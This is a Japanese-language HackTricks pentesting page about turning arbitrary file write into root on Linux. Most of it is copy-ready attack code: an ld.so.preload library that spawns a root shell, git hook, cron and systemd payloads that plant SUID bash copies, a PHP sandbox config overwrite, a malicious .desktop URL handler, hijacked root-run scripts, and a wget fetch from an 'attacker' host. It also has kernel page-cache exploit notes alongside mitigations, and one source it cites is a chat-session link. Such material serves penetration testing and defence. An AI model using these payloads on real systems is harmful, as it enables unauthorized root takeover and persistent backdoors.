# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

このファイルは **`LD_PRELOAD`** 環境変数のように動作しますが、**SUID binaries** でも機能します。\
これを作成または変更できるなら、実行される各 binary と一緒に読み込まれる **library への path** を追加するだけです。

例えば: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) は、git repository 内で commit が作成されたときや merge されたときなど、さまざまな **events** で **run** される **scripts** です。つまり、**privileged script or user** がこれらの actions を頻繁に実行していて、かつ **`.git` folder** に **write** できるなら、これを **privesc** に使えます。

例えば、git repo の **`.git/hooks`** に **script** を生成しておけば、新しい commit が作成されるたびに必ず実行されます:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

root が実行する cron 関連ファイルに**書き込める**なら、通常はそのジョブが次回実行されたときに code execution を得られます。興味深い対象には以下が含まれます:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- `/var/spool/cron/` または `/var/spool/cron/crontabs/` にある root 自身の crontab
- `systemd` timers と、それらが起動する services

Quick checks:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
典型的な悪用経路:

- **新しい root cron job を追加**して `/etc/crontab` または `/etc/cron.d/` 内のファイルに書き込む
- `run-parts` によってすでに実行されている**スクリプトを置き換える**
- 起動されるスクリプトまたは binary を改変して、**既存の timer target に backdoor を仕込む**

最小の cron payload の例:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
もし `run-parts` が使う cron ディレクトリにしか書き込めない場合は、代わりにそこへ実行可能ファイルを置いてください:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notes:

- `run-parts` は通常、ドットを含むファイル名を無視するので、`backup.sh` より `backup` のような名前を優先する。
- 一部のディストリビューションでは、従来の cron の代わりに `anacron` や `systemd` timers を使うが、悪用の考え方は同じ: **あとで root が実行するものを変更する**。

### Service & Socket files

`systemd` unit files や、それらから参照されるファイルに書き込める場合、unit を再読み込みして再起動するか、service/socket の activation path が発火するのを待つことで、root として code execution を得られる可能性がある。

興味深い対象には以下が含まれる:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` 内の Drop-in overrides
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` で参照される service scripts/binaries
- root service により読み込まれる書き込み可能な `EnvironmentFile=` のパス

Quick checks:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
一般的な悪用パス:

- **`ExecStart=` を上書きする** 変更可能な root 所有の service unit 内で
- **drop-in override を追加する** 悪意ある `ExecStart=` を設定し、先に古いものを消す
- **unit から既に参照されている script/binary に backdoor を仕込む**
- **socket で起動される service を hijack する** socket が接続を受けたときに起動する対応する `.service` file を変更して

悪意ある override の例:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
典型的なアクティベーションフロー:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
サービスを自分で再起動できない場合でも、socket-activated な unit を編集できるなら、**クライアント接続を待つだけ**で、backdoored されたサービスを root で実行させられることがあります。

### 特権 PHP sandbox で使われる制限付き `php.ini` を上書きする

一部の custom daemons は、`php` を **制限された `php.ini`** で実行して、ユーザー入力の PHP を検証します（例: `disable_functions=exec,system,...`）。もし sandbox 内のコードがまだ **何らかの write primitive**（たとえば `file_put_contents`）を持っていて、daemon が使っている **正確な `php.ini` の path** に到達できるなら、その config を **上書きして制限を解除**し、その後で **昇格した権限で動く** 2つ目の payload を送れます。

典型的な流れ:

1. まずの payload で sandbox の config を上書きする。
2. 次の payload で、dangerous functions が再有効化された状態で code を実行する。

最小例（daemon が使う path に置き換えてください）:
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
デーモンがrootとして実行される場合（またはroot所有のパスで検証される場合）、2回目の実行でrootコンテキストになります。これは、sandbox化されたruntimeがまだファイルを書き込めるときの、本質的には **config overwriteによるprivilege escalation** です。

### binfmt_misc

`/proc/sys/fs/binfmt_misc` にあるファイルは、どのbinaryがどの種類のファイルを実行するべきかを示します。TODO: 一般的なファイルタイプを開いたときにrev shellを実行するためにこれを悪用する要件を確認する。

### Overwrite schema handlers (like http: or https:)

被害者のconfiguration directoriesに書き込み権限を持つattackerは、system behaviorを変更するファイルを簡単に置き換えたり作成したりでき、その結果、意図しないcode executionにつながります。`$HOME/.config/mimeapps.list` ファイルを変更してHTTPとHTTPSのURL handlersを悪意あるファイルに向けることで（たとえば `x-scheme-handler/http=evil.desktop` のように設定することで）、attackerは **任意のhttpまたはhttpsリンクのクリックで `evil.desktop` ファイル内に指定されたcodeが実行される** ことを確実にできます。たとえば、`$HOME/.local/share/applications` に次の悪意あるcodeを `evil.desktop` として配置した後、外部URLをクリックすると埋め込まれたcommandが実行されます:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
詳細は、実際の脆弱性を悪用するために使われた [**この投稿**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) を確認してください。

### Root executing user-writable scripts/binaries

特権付きのワークフローが `/bin/sh /home/username/.../script` のようなものを実行する場合（または権限のないユーザーが所有するディレクトリ内の任意の binary を実行する場合）、それを hijack できます:

- **実行を検出する:** [pspy](https://github.com/DominicBreuker/pspy) で process を監視し、root が user-controlled paths を呼び出すのを捕捉する:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **書き込み可能性を確認:** 対象ファイルとそのディレクトリの両方が、あなたのユーザーに所有されているか、書き込み可能であることを確認する。
- **対象をハイジャック:** 元の binary/script をバックアップし、SUID shell（または他の root action）を作成する payload を配置してから、permissions を復元する:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **特権アクションをトリガーする**（例: helper を起動する UI ボタンを押す）。root が hijacked path を再実行したら、`./rootshell -p` で昇格した shell を取得する。

### 特権バイナリの page-cache-only ファイル改変

一部の kernel bug はファイルを **disk 上で** 変更しない。その代わり、読み取り可能なファイルの **page cache copy** のみを改変できる。対象が **setuid** もしくはそれ以外の方法で **root-executed** される binary なら、次回の実行時に attacker-controlled なバイトが memory から実行され、disk 上の file hash が変わっていなくても権限昇格できる可能性がある。

これは **runtime-only file write primitive** として考えると分かりやすい:

- **Disk stays clean**: inode と disk 上の bytes は変わらない
- **Memory is dirty**: cached page を読み/実行する process は attacker-modified な内容を見る
- **Effect is temporary**: reboot 後や cache eviction 後に変更は消える

この primitive は、従来の **arbitrary file write** と、Dirty COW / Dirty Pipe のような古い **page-cache abuse** bug の間に位置する:

- Dirty COW は race に依存した
- Dirty Pipe には write-position の制約があった
- page-cache-only primitive は、vulnerable path が cached file-backed pages へ直接書き込めるなら、より reliable になり得る

#### Generic privesc flow

1. **file-backed page cache pages** に書ける kernel primitive を入手する
2. それを **readable privileged binary** か、別の root-executed file に対して使う
3. page が cache から evict される **前に** execution をトリガーする
4. on-disk file が未変更に見えるまま root で code execution を得る

典型的な high-value target:

- **setuid-root** binaries
- **root services** によって起動される helper
- host kernel/page cache を共有する **containers** から一般的に実行される binaries

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) はこのクラスの良い例。vulnerable path は Linux crypto userspace API (`AF_ALG` / `algif_aead`) にあった:

- `splice()` は読み取り可能な file から page-cache pages への参照を crypto TX scatterlist に移動できる
- in-place の `algif_aead` decrypt path は source と destination buffers を再利用した
- `authencesn` はその後 destination tag region に書き込んだ
- その region がまだ spliced file-backed pages を参照していると、その write は target file の **page cache** に着地した

つまり重要なのは CVE そのものではなく、次の pattern である:

- file-backed cache pages を kernel subsystem に **feed** する
- その subsystem にそれらを **writable output** として扱わせる
- memory 上で小さな制御された overwrite を発生させる

公開された PoC は、`/usr/bin/su` を memory 上で patch するために繰り返し **4-byte writes** を使い、その後それを実行した。

#### Exposure and hunting

このクラスの bug を疑うなら、disk integrity checks だけに頼らないこと。以下も確認する:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` はモジュールとしてロード/アンロード可能な場合がある
- `CONFIG_CRYPTO_USER_API_AEAD=y`: そのインターフェースはカーネルに組み込まれている
- setuid バイナリは良いターゲットである。なぜなら、page-cache-only patch だけで local foothold を root に変えられることがあるから

#### `algif_aead` パスの attack-surface reduction

脆弱なインターフェースが loadable module として提供されている場合:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
カーネルにコンパイルされている場合、いくつかの開示では、init path を次のようにブロックすると報告されています:
```bash
initcall_blacklist=algif_aead_init
```
この種の緩和策は、他の kernel LPEs に対しても覚えておく価値があります。exploit が特定のオプション interface に依存している場合、その interface を無効化または blacklist することで、完全な kernel upgrade が利用可能になる前でも exploit path を壊せることがあります。

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)

{{#include ../../banners/hacktricks-training.md}}
